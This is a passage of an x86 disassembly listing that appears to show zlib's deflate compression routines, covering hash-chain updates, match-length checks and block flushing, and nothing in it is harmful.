  40452a:	77 60                	ja     0x40458c
  40452c:	83 f9 03             	cmp    $0x3,%ecx
  40452f:	72 5b                	jb     0x40458c
  404531:	48                   	dec    %eax
  404532:	89 46 60             	mov    %eax,0x60(%esi)
  404535:	01 6e 6c             	add    %ebp,0x6c(%esi)
  404538:	8b 56 6c             	mov    0x6c(%esi),%edx
  40453b:	8b 5e 48             	mov    0x48(%esi),%ebx
  40453e:	8b 4e 58             	mov    0x58(%esi),%ecx
  404541:	8b 46 38             	mov    0x38(%esi),%eax
  404544:	0f b6 44 02 02       	movzbl 0x2(%edx,%eax,1),%eax
  404549:	d3 e3                	shl    %cl,%ebx
  40454b:	8b 4e 44             	mov    0x44(%esi),%ecx
  40454e:	33 c3                	xor    %ebx,%eax
  404550:	23 46 54             	and    0x54(%esi),%eax
  404553:	8b 5e 34             	mov    0x34(%esi),%ebx
  404556:	23 da                	and    %edx,%ebx
  404558:	8b 56 40             	mov    0x40(%esi),%edx
  40455b:	89 46 48             	mov    %eax,0x48(%esi)
  40455e:	66 8b 04 41          	mov    (%ecx,%eax,2),%ax
  404562:	66 89 04 5a          	mov    %ax,(%edx,%ebx,2)
  404566:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  404569:	23 4e 34             	and    0x34(%esi),%ecx
  40456c:	8b 56 40             	mov    0x40(%esi),%edx
  40456f:	0f b7 1c 4a          	movzwl (%edx,%ecx,2),%ebx
  404573:	8b 46 48             	mov    0x48(%esi),%eax
  404576:	8b 4e 44             	mov    0x44(%esi),%ecx
  404579:	66 8b 56 6c          	mov    0x6c(%esi),%dx
  40457d:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  404581:	83 46 60 ff          	addl   $0xffffffff,0x60(%esi)
  404585:	75 ae                	jne    0x404535
  404587:	e9 86 00 00 00       	jmp    0x404612
  40458c:	01 46 6c             	add    %eax,0x6c(%esi)
  40458f:	8b 46 6c             	mov    0x6c(%esi),%eax
  404592:	8b 4e 38             	mov    0x38(%esi),%ecx
  404595:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  404598:	8b 4e 58             	mov    0x58(%esi),%ecx
  40459b:	c7 46 60 00 00 00 00 	movl   $0x0,0x60(%esi)
  4045a2:	0f b6 02             	movzbl (%edx),%eax
  4045a5:	89 46 48             	mov    %eax,0x48(%esi)
  4045a8:	0f b6 52 01          	movzbl 0x1(%edx),%edx
  4045ac:	d3 e0                	shl    %cl,%eax
  4045ae:	33 c2                	xor    %edx,%eax
  4045b0:	23 46 54             	and    0x54(%esi),%eax
  4045b3:	89 46 48             	mov    %eax,0x48(%esi)
  4045b6:	eb 5d                	jmp    0x404615
  4045b8:	8b 46 6c             	mov    0x6c(%esi),%eax
  4045bb:	8b 4e 38             	mov    0x38(%esi),%ecx
  4045be:	8a 04 08             	mov    (%eax,%ecx,1),%al
  4045c1:	8b 96 a0 16 00 00    	mov    0x16a0(%esi),%edx
  4045c7:	8b 8e a4 16 00 00    	mov    0x16a4(%esi),%ecx
  4045cd:	33 ff                	xor    %edi,%edi
  4045cf:	66 89 3c 51          	mov    %di,(%ecx,%edx,2)
  4045d3:	8b 8e a0 16 00 00    	mov    0x16a0(%esi),%ecx
  4045d9:	8b 96 98 16 00 00    	mov    0x1698(%esi),%edx
  4045df:	88 04 0a             	mov    %al,(%edx,%ecx,1)
  4045e2:	01 ae a0 16 00 00    	add    %ebp,0x16a0(%esi)
  4045e8:	0f b6 d0             	movzbl %al,%edx
  4045eb:	66 01 ac 96 94 00 00 	add    %bp,0x94(%esi,%edx,4)
  4045f2:	00 
  4045f3:	8d 84 96 94 00 00 00 	lea    0x94(%esi,%edx,4),%eax
  4045fa:	8b 86 9c 16 00 00    	mov    0x169c(%esi),%eax
  404600:	33 c9                	xor    %ecx,%ecx
  404602:	2b c5                	sub    %ebp,%eax
  404604:	39 86 a0 16 00 00    	cmp    %eax,0x16a0(%esi)
  40460a:	0f 94 c1             	sete   %cl
  40460d:	ff 4e 74             	decl   0x74(%esi)
  404610:	8b f9                	mov    %ecx,%edi
  404612:	01 6e 6c             	add    %ebp,0x6c(%esi)
  404615:	85 ff                	test   %edi,%edi
  404617:	0f 84 83 fd ff ff    	je     0x4043a0
  40461d:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  404620:	85 c9                	test   %ecx,%ecx
  404622:	7c 07                	jl     0x40462b
  404624:	8b 46 38             	mov    0x38(%esi),%eax
  404627:	03 c1                	add    %ecx,%eax
  404629:	eb 02                	jmp    0x40462d
  40462b:	33 c0                	xor    %eax,%eax
  40462d:	8b 56 6c             	mov    0x6c(%esi),%edx
  404630:	6a 00                	push   $0x0
  404632:	2b d1                	sub    %ecx,%edx
  404634:	52                   	push   %edx
  404635:	50                   	push   %eax
  404636:	56                   	push   %esi
  404637:	e8 14 64 00 00       	call   0x40aa50
  40463c:	8b 46 6c             	mov    0x6c(%esi),%eax
  40463f:	8b 3e                	mov    (%esi),%edi
  404641:	89 46 5c             	mov    %eax,0x5c(%esi)
  404644:	8b 47 1c             	mov    0x1c(%edi),%eax
  404647:	8b 68 14             	mov    0x14(%eax),%ebp
  40464a:	8b 4f 10             	mov    0x10(%edi),%ecx
  40464d:	83 c4 10             	add    $0x10,%esp
  404650:	3b e9                	cmp    %ecx,%ebp
  404652:	76 02                	jbe    0x404656
  404654:	8b e9                	mov    %ecx,%ebp
  404656:	85 ed                	test   %ebp,%ebp
  404658:	74 35                	je     0x40468f
  40465a:	8b 48 10             	mov    0x10(%eax),%ecx
  40465d:	8b 57 0c             	mov    0xc(%edi),%edx
  404660:	55                   	push   %ebp
  404661:	51                   	push   %ecx
  404662:	52                   	push   %edx
  404663:	e8 e8 6c 00 00       	call   0x40b350
  404668:	8b 47 1c             	mov    0x1c(%edi),%eax
  40466b:	01 6f 0c             	add    %ebp,0xc(%edi)
  40466e:	01 68 10             	add    %ebp,0x10(%eax)
  404671:	01 6f 14             	add    %ebp,0x14(%edi)
  404674:	29 6f 10             	sub    %ebp,0x10(%edi)
  404677:	8b 47 1c             	mov    0x1c(%edi),%eax
  40467a:	29 68 14             	sub    %ebp,0x14(%eax)
  40467d:	8b 7f 1c             	mov    0x1c(%edi),%edi
  404680:	83 c4 0c             	add    $0xc,%esp
  404683:	83 7f 14 00          	cmpl   $0x0,0x14(%edi)
  404687:	75 06                	jne    0x40468f
  404689:	8b 47 08             	mov    0x8(%edi),%eax
  40468c:	89 47 10             	mov    %eax,0x10(%edi)
  40468f:	8b 0e                	mov    (%esi),%ecx
  404691:	83 79 10 00          	cmpl   $0x0,0x10(%ecx)
  404695:	0f 85 05 fd ff ff    	jne    0x4043a0
  40469b:	5f                   	pop    %edi
  40469c:	5e                   	pop    %esi
  40469d:	5d                   	pop    %ebp
  40469e:	33 c0                	xor    %eax,%eax
  4046a0:	5b                   	pop    %ebx
  4046a1:	c3                   	ret
  4046a2:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  4046a5:	85 c9                	test   %ecx,%ecx
  4046a7:	7c 07                	jl     0x4046b0
  4046a9:	8b 46 38             	mov    0x38(%esi),%eax
  4046ac:	03 c1                	add    %ecx,%eax
  4046ae:	eb 02                	jmp    0x4046b2
  4046b0:	33 c0                	xor    %eax,%eax
  4046b2:	33 d2                	xor    %edx,%edx
  4046b4:	83 ff 04             	cmp    $0x4,%edi
  4046b7:	0f 94 c2             	sete   %dl
  4046ba:	52                   	push   %edx
  4046bb:	8b 56 6c             	mov    0x6c(%esi),%edx
  4046be:	2b d1                	sub    %ecx,%edx
  4046c0:	52                   	push   %edx
  4046c1:	50                   	push   %eax
  4046c2:	56                   	push   %esi
  4046c3:	e8 88 63 00 00       	call   0x40aa50
  4046c8:	8b 46 6c             	mov    0x6c(%esi),%eax
  4046cb:	89 46 5c             	mov    %eax,0x5c(%esi)
  4046ce:	8b 06                	mov    (%esi),%eax
  4046d0:	83 c4 10             	add    $0x10,%esp
  4046d3:	e8 e8 eb ff ff       	call   0x4032c0
  4046d8:	8b 0e                	mov    (%esi),%ecx
  4046da:	33 c0                	xor    %eax,%eax
  4046dc:	39 41 10             	cmp    %eax,0x10(%ecx)
  4046df:	75 0f                	jne    0x4046f0
  4046e1:	83 ff 04             	cmp    $0x4,%edi
  4046e4:	0f 95 c0             	setne  %al
  4046e7:	5f                   	pop    %edi
  4046e8:	5e                   	pop    %esi
  4046e9:	5d                   	pop    %ebp
  4046ea:	5b                   	pop    %ebx
  4046eb:	48                   	dec    %eax
  4046ec:	83 e0 02             	and    $0x2,%eax
  4046ef:	c3                   	ret
  4046f0:	83 ff 04             	cmp    $0x4,%edi
  4046f3:	0f 94 c0             	sete   %al
  4046f6:	5f                   	pop    %edi
  4046f7:	5e                   	pop    %esi
  4046f8:	5d                   	pop    %ebp
  4046f9:	5b                   	pop    %ebx
  4046fa:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  4046fe:	c3                   	ret
  4046ff:	cc                   	int3
  404700:	51                   	push   %ecx
  404701:	53                   	push   %ebx
  404702:	55                   	push   %ebp
  404703:	56                   	push   %esi
  404704:	8b 74 24 14          	mov    0x14(%esp),%esi
  404708:	57                   	push   %edi
  404709:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404710:	00 
  404711:	bd 01 00 00 00       	mov    $0x1,%ebp
  404716:	8b 46 74             	mov    0x74(%esi),%eax
  404719:	3d 06 01 00 00       	cmp    $0x106,%eax
  40471e:	73 23                	jae    0x404743
  404720:	e8 3b f9 ff ff       	call   0x404060
  404725:	8b 46 74             	mov    0x74(%esi),%eax
  404728:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40472c:	3d 06 01 00 00       	cmp    $0x106,%eax
  404731:	73 08                	jae    0x40473b
  404733:	85 ff                	test   %edi,%edi
  404735:	0f 84 a0 02 00 00    	je     0x4049db
  40473b:	85 c0                	test   %eax,%eax
  40473d:	0f 84 8e 03 00 00    	je     0x404ad1
  404743:	83 f8 03             	cmp    $0x3,%eax
  404746:	72 4d                	jb     0x404795
  404748:	8b 46 48             	mov    0x48(%esi),%eax
  40474b:	8b 4e 58             	mov    0x58(%esi),%ecx
  40474e:	8b 56 6c             	mov    0x6c(%esi),%edx
  404751:	8b 7e 34             	mov    0x34(%esi),%edi
  404754:	d3 e0                	shl    %cl,%eax
  404756:	8b 4e 38             	mov    0x38(%esi),%ecx
  404759:	0f b6 4c 11 02       	movzbl 0x2(%ecx,%edx,1),%ecx
  40475e:	33 c1                	xor    %ecx,%eax
  404760:	23 46 54             	and    0x54(%esi),%eax
  404763:	8b 4e 44             	mov    0x44(%esi),%ecx
  404766:	89 46 48             	mov    %eax,0x48(%esi)
  404769:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  40476d:	23 fa                	and    %edx,%edi
  40476f:	8b 56 40             	mov    0x40(%esi),%edx
  404772:	66 89 04 7a          	mov    %ax,(%edx,%edi,2)
  404776:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  404779:	23 4e 34             	and    0x34(%esi),%ecx
  40477c:	8b 56 40             	mov    0x40(%esi),%edx
  40477f:	0f b7 04 4a          	movzwl (%edx,%ecx,2),%eax
  404783:	8b 4e 48             	mov    0x48(%esi),%ecx
  404786:	8b 56 44             	mov    0x44(%esi),%edx
  404789:	89 44 24 10          	mov    %eax,0x10(%esp)
  40478d:	0f b7 46 6c          	movzwl 0x6c(%esi),%eax
  404791:	66 89 04 4a          	mov    %ax,(%edx,%ecx,2)
  404795:	8b 56 70             	mov    0x70(%esi),%edx
  404798:	8b 4e 60             	mov    0x60(%esi),%ecx
  40479b:	89 56 64             	mov    %edx,0x64(%esi)
  40479e:	8b 54 24 10          	mov    0x10(%esp),%edx
  4047a2:	bb 02 00 00 00       	mov    $0x2,%ebx
  4047a7:	89 4e 78             	mov    %ecx,0x78(%esi)
  4047aa:	89 5e 60             	mov    %ebx,0x60(%esi)
  4047ad:	85 d2                	test   %edx,%edx
  4047af:	74 71                	je     0x404822
  4047b1:	8b c1                	mov    %ecx,%eax
  4047b3:	3b 86 80 00 00 00    	cmp    0x80(%esi),%eax
  4047b9:	73 67                	jae    0x404822
  4047bb:	8b 46 6c             	mov    0x6c(%esi),%eax
  4047be:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  4047c1:	2b c2                	sub    %edx,%eax
  4047c3:	81 e9 06 01 00 00    	sub    $0x106,%ecx
  4047c9:	3b c1                	cmp    %ecx,%eax
  4047cb:	77 55                	ja     0x404822
  4047cd:	8b 8e 88 00 00 00    	mov    0x88(%esi),%ecx
  4047d3:	3b cb                	cmp    %ebx,%ecx
  4047d5:	74 10                	je     0x4047e7
  4047d7:	83 f9 03             	cmp    $0x3,%ecx
  4047da:	74 10                	je     0x4047ec
  4047dc:	8b c2                	mov    %edx,%eax
  4047de:	8b fe                	mov    %esi,%edi
  4047e0:	e8 7b f6 ff ff       	call   0x403e60
  4047e5:	eb 12                	jmp    0x4047f9
  4047e7:	83 f9 03             	cmp    $0x3,%ecx
  4047ea:	75 10                	jne    0x4047fc
  4047ec:	3b c5                	cmp    %ebp,%eax
  4047ee:	75 0c                	jne    0x4047fc
  4047f0:	52                   	push   %edx
  4047f1:	e8 ca f7 ff ff       	call   0x403fc0
  4047f6:	83 c4 04             	add    $0x4,%esp
  4047f9:	89 46 60             	mov    %eax,0x60(%esi)
  4047fc:	8b 46 60             	mov    0x60(%esi),%eax
  4047ff:	83 f8 05             	cmp    $0x5,%eax
  404802:	77 1e                	ja     0x404822
  404804:	39 ae 88 00 00 00    	cmp    %ebp,0x88(%esi)
  40480a:	74 13                	je     0x40481f
  40480c:	83 f8 03             	cmp    $0x3,%eax
  40480f:	75 11                	jne    0x404822
  404811:	8b 56 6c             	mov    0x6c(%esi),%edx
  404814:	2b 56 70             	sub    0x70(%esi),%edx
  404817:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  40481d:	76 03                	jbe    0x404822
  40481f:	89 5e 60             	mov    %ebx,0x60(%esi)
  404822:	8b 46 78             	mov    0x78(%esi),%eax
  404825:	83 f8 03             	cmp    $0x3,%eax
  404828:	0f 82 b5 01 00 00    	jb     0x4049e3
  40482e:	39 46 60             	cmp    %eax,0x60(%esi)
  404831:	0f 87 ac 01 00 00    	ja     0x4049e3
  404837:	66 8b 56 6c          	mov    0x6c(%esi),%dx
  40483b:	66 2b 56 64          	sub    0x64(%esi),%dx
  40483f:	8b 46 6c             	mov    0x6c(%esi),%eax
  404842:	8b 4e 74             	mov    0x74(%esi),%ecx
  404845:	8b 9e a4 16 00 00    	mov    0x16a4(%esi),%ebx
  40484b:	8d 7c 08 fd          	lea    -0x3(%eax,%ecx,1),%edi
  40484f:	8a 46 78             	mov    0x78(%esi),%al
  404852:	66 2b d5             	sub    %bp,%dx
  404855:	0f b7 ca             	movzwl %dx,%ecx
  404858:	8b 96 a0 16 00 00    	mov    0x16a0(%esi),%edx
  40485e:	66 89 0c 53          	mov    %cx,(%ebx,%edx,2)
  404862:	8b 96 98 16 00 00    	mov    0x1698(%esi),%edx
  404868:	8b 9e a0 16 00 00    	mov    0x16a0(%esi),%ebx
  40486e:	2c 03                	sub    $0x3,%al
  404870:	88 04 1a             	mov    %al,(%edx,%ebx,1)
  404873:	01 ae a0 16 00 00    	add    %ebp,0x16a0(%esi)
  404879:	0f b6 c0             	movzbl %al,%eax
  40487c:	0f b6 90 d8 ed 41 00 	movzbl 0x41edd8(%eax),%edx
  404883:	66 01 ac 96 98 04 00 	add    %bp,0x498(%esi,%edx,4)
  40488a:	00 
  40488b:	8d 84 96 98 04 00 00 	lea    0x498(%esi,%edx,4),%eax
  404892:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  404898:	b8 00 01 00 00       	mov    $0x100,%eax
  40489d:	66 3b c8             	cmp    %ax,%cx
  4048a0:	73 0c                	jae    0x4048ae
  4048a2:	0f b7 c9             	movzwl %cx,%ecx
  4048a5:	0f b6 81 d8 eb 41 00 	movzbl 0x41ebd8(%ecx),%eax
  4048ac:	eb 0d                	jmp    0x4048bb
  4048ae:	0f b7 d1             	movzwl %cx,%edx
  4048b1:	c1 ea 07             	shr    $0x7,%edx
  4048b4:	0f b6 82 d8 ec 41 00 	movzbl 0x41ecd8(%edx),%eax
  4048bb:	66 01 ac 86 88 09 00 	add    %bp,0x988(%esi,%eax,4)
  4048c2:	00 
  4048c3:	8b 86 9c 16 00 00    	mov    0x169c(%esi),%eax
  4048c9:	2b c5                	sub    %ebp,%eax
  4048cb:	33 db                	xor    %ebx,%ebx
  4048cd:	39 86 a0 16 00 00    	cmp    %eax,0x16a0(%esi)
  4048d3:	8b 46 78             	mov    0x78(%esi),%eax
  4048d6:	0f 94 c3             	sete   %bl
  4048d9:	8b cd                	mov    %ebp,%ecx
  4048db:	2b c8                	sub    %eax,%ecx
  4048dd:	01 4e 74             	add    %ecx,0x74(%esi)
  4048e0:	83 c0 fe             	add    $0xfffffffe,%eax
  4048e3:	89 46 78             	mov    %eax,0x78(%esi)
  4048e6:	01 6e 6c             	add    %ebp,0x6c(%esi)
  4048e9:	8b 56 6c             	mov    0x6c(%esi),%edx
  4048ec:	3b d7                	cmp    %edi,%edx
  4048ee:	77 4e                	ja     0x40493e
  4048f0:	8b 46 48             	mov    0x48(%esi),%eax
  4048f3:	8b 4e 58             	mov    0x58(%esi),%ecx
  4048f6:	8b 6e 40             	mov    0x40(%esi),%ebp
  4048f9:	d3 e0                	shl    %cl,%eax
  4048fb:	8b 4e 38             	mov    0x38(%esi),%ecx
  4048fe:	0f b6 4c 11 02       	movzbl 0x2(%ecx,%edx,1),%ecx
  404903:	23 56 34             	and    0x34(%esi),%edx
  404906:	33 c1                	xor    %ecx,%eax
  404908:	23 46 54             	and    0x54(%esi),%eax
  40490b:	8b 4e 44             	mov    0x44(%esi),%ecx
  40490e:	89 46 48             	mov    %eax,0x48(%esi)
  404911:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  404915:	66 89 44 55 00       	mov    %ax,0x0(%ebp,%edx,2)
  40491a:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  40491d:	23 4e 34             	and    0x34(%esi),%ecx
  404920:	8b 56 40             	mov    0x40(%esi),%edx
  404923:	0f b7 04 4a          	movzwl (%edx,%ecx,2),%eax
  404927:	8b 4e 48             	mov    0x48(%esi),%ecx
  40492a:	8b 56 44             	mov    0x44(%esi),%edx
  40492d:	89 44 24 10          	mov    %eax,0x10(%esp)
  404931:	0f b7 46 6c          	movzwl 0x6c(%esi),%eax
  404935:	66 89 04 4a          	mov    %ax,(%edx,%ecx,2)
  404939:	bd 01 00 00 00       	mov    $0x1,%ebp
  40493e:	83 46 78 ff          	addl   $0xffffffff,0x78(%esi)
  404942:	75 a2                	jne    0x4048e6
  404944:	01 6e 6c             	add    %ebp,0x6c(%esi)
  404947:	8b 46 6c             	mov    0x6c(%esi),%eax
  40494a:	c7 46 68 00 00 00 00 	movl   $0x0,0x68(%esi)
  404951:	c7 46 60 02 00 00 00 	movl   $0x2,0x60(%esi)
  404958:	85 db                	test   %ebx,%ebx
  40495a:	0f 84 b6 fd ff ff    	je     0x404716
  404960:	8b 56 5c             	mov    0x5c(%esi),%edx
  404963:	85 d2                	test   %edx,%edx
  404965:	7c 07                	jl     0x40496e
  404967:	8b 4e 38             	mov    0x38(%esi),%ecx
  40496a:	03 ca                	add    %edx,%ecx
  40496c:	eb 02                	jmp    0x404970
  40496e:	33 c9                	xor    %ecx,%ecx
  404970:	6a 00                	push   $0x0
  404972:	2b c2                	sub    %edx,%eax
  404974:	50                   	push   %eax
  404975:	51                   	push   %ecx
  404976:	56                   	push   %esi
  404977:	e8 d4 60 00 00       	call   0x40aa50
  40497c:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  40497f:	8b 3e                	mov    (%esi),%edi
  404981:	89 4e 5c             	mov    %ecx,0x5c(%esi)
  404984:	8b 47 1c             	mov    0x1c(%edi),%eax
  404987:	8b 58 14             	mov    0x14(%eax),%ebx
  40498a:	8b 4f 10             	mov    0x10(%edi),%ecx
  40498d:	83 c4 10             	add    $0x10,%esp
  404990:	3b d9                	cmp    %ecx,%ebx
  404992:	76 02                	jbe    0x404996
  404994:	8b d9                	mov    %ecx,%ebx
  404996:	85 db                	test   %ebx,%ebx
  404998:	74 35                	je     0x4049cf
  40499a:	8b 50 10             	mov    0x10(%eax),%edx
  40499d:	8b 47 0c             	mov    0xc(%edi),%eax
  4049a0:	53                   	push   %ebx
  4049a1:	52                   	push   %edx
  4049a2:	50                   	push   %eax
  4049a3:	e8 a8 69 00 00       	call   0x40b350
  4049a8:	8b 47 1c             	mov    0x1c(%edi),%eax
  4049ab:	01 5f 0c             	add    %ebx,0xc(%edi)
  4049ae:	01 58 10             	add    %ebx,0x10(%eax)
  4049b1:	01 5f 14             	add    %ebx,0x14(%edi)
  4049b4:	29 5f 10             	sub    %ebx,0x10(%edi)
  4049b7:	8b 47 1c             	mov    0x1c(%edi),%eax
  4049ba:	29 58 14             	sub    %ebx,0x14(%eax)
  4049bd:	8b 7f 1c             	mov    0x1c(%edi),%edi
  4049c0:	83 c4 0c             	add    $0xc,%esp
  4049c3:	83 7f 14 00          	cmpl   $0x0,0x14(%edi)
  4049c7:	75 06                	jne    0x4049cf
  4049c9:	8b 4f 08             	mov    0x8(%edi),%ecx
  4049cc:	89 4f 10             	mov    %ecx,0x10(%edi)
  4049cf:	8b 16                	mov    (%esi),%edx
  4049d1:	83 7a 10 00          	cmpl   $0x0,0x10(%edx)
  4049d5:	0f 85 3b fd ff ff    	jne    0x404716
  4049db:	5f                   	pop    %edi
  4049dc:	5e                   	pop    %esi
  4049dd:	5d                   	pop    %ebp
  4049de:	33 c0                	xor    %eax,%eax
  4049e0:	5b                   	pop    %ebx
  4049e1:	59                   	pop    %ecx
  4049e2:	c3                   	ret
  4049e3:	83 7e 68 00          	cmpl   $0x0,0x68(%esi)
  4049e7:	0f 84 d6 00 00 00    	je     0x404ac3
  4049ed:	8b 46 6c             	mov    0x6c(%esi),%eax
  4049f0:	8b 4e 38             	mov    0x38(%esi),%ecx
  4049f3:	8a 44 08 ff          	mov    -0x1(%eax,%ecx,1),%al
  4049f7:	8b 96 a0 16 00 00    	mov    0x16a0(%esi),%edx
  4049fd:	8b 8e a4 16 00 00    	mov    0x16a4(%esi),%ecx
  404a03:	33 ff                	xor    %edi,%edi
  404a05:	66 89 3c 51          	mov    %di,(%ecx,%edx,2)
  404a09:	8b 96 98 16 00 00    	mov    0x1698(%esi),%edx
  404a0f:	8b 8e a0 16 00 00    	mov    0x16a0(%esi),%ecx
  404a15:	88 04 0a             	mov    %al,(%edx,%ecx,1)
  404a18:	01 ae a0 16 00 00    	add    %ebp,0x16a0(%esi)
  404a1e:	0f b6 d0             	movzbl %al,%edx
  404a21:	66 01 ac 96 94 00 00 	add    %bp,0x94(%esi,%edx,4)
  404a28:	00 
  404a29:	8d 84 96 94 00 00 00 	lea    0x94(%esi,%edx,4),%eax
  404a30:	8b 86 9c 16 00 00    	mov    0x169c(%esi),%eax
  404a36:	2b c5                	sub    %ebp,%eax
  404a38:	39 86 a0 16 00 00    	cmp    %eax,0x16a0(%esi)
  404a3e:	75 72                	jne    0x404ab2
  404a40:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  404a43:	85 c9                	test   %ecx,%ecx
  404a45:	7c 07                	jl     0x404a4e
  404a47:	8b 46 38             	mov    0x38(%esi),%eax
  404a4a:	03 c1                	add    %ecx,%eax
  404a4c:	eb 02                	jmp    0x404a50
  404a4e:	33 c0                	xor    %eax,%eax
  404a50:	8b 56 6c             	mov    0x6c(%esi),%edx
  404a53:	6a 00                	push   $0x0
  404a55:	2b d1                	sub    %ecx,%edx
  404a57:	52                   	push   %edx
  404a58:	50                   	push   %eax
  404a59:	56                   	push   %esi
  404a5a:	e8 f1 5f 00 00       	call   0x40aa50
  404a5f:	8b 46 6c             	mov    0x6c(%esi),%eax
  404a62:	8b 3e                	mov    (%esi),%edi
  404a64:	89 46 5c             	mov    %eax,0x5c(%esi)
  404a67:	8b 47 1c             	mov    0x1c(%edi),%eax
  404a6a:	8b 58 14             	mov    0x14(%eax),%ebx
  404a6d:	8b 4f 10             	mov    0x10(%edi),%ecx
  404a70:	83 c4 10             	add    $0x10,%esp
  404a73:	3b d9                	cmp    %ecx,%ebx
  404a75:	76 02                	jbe    0x404a79
  404a77:	8b d9                	mov    %ecx,%ebx
  404a79:	85 db                	test   %ebx,%ebx
  404a7b:	74 35                	je     0x404ab2
  404a7d:	8b 48 10             	mov    0x10(%eax),%ecx
  404a80:	8b 57 0c             	mov    0xc(%edi),%edx
  404a83:	53                   	push   %ebx
  404a84:	51                   	push   %ecx
  404a85:	52                   	push   %edx
  404a86:	e8 c5 68 00 00       	call   0x40b350
  404a8b:	8b 47 1c             	mov    0x1c(%edi),%eax
  404a8e:	01 5f 0c             	add    %ebx,0xc(%edi)
  404a91:	01 58 10             	add    %ebx,0x10(%eax)
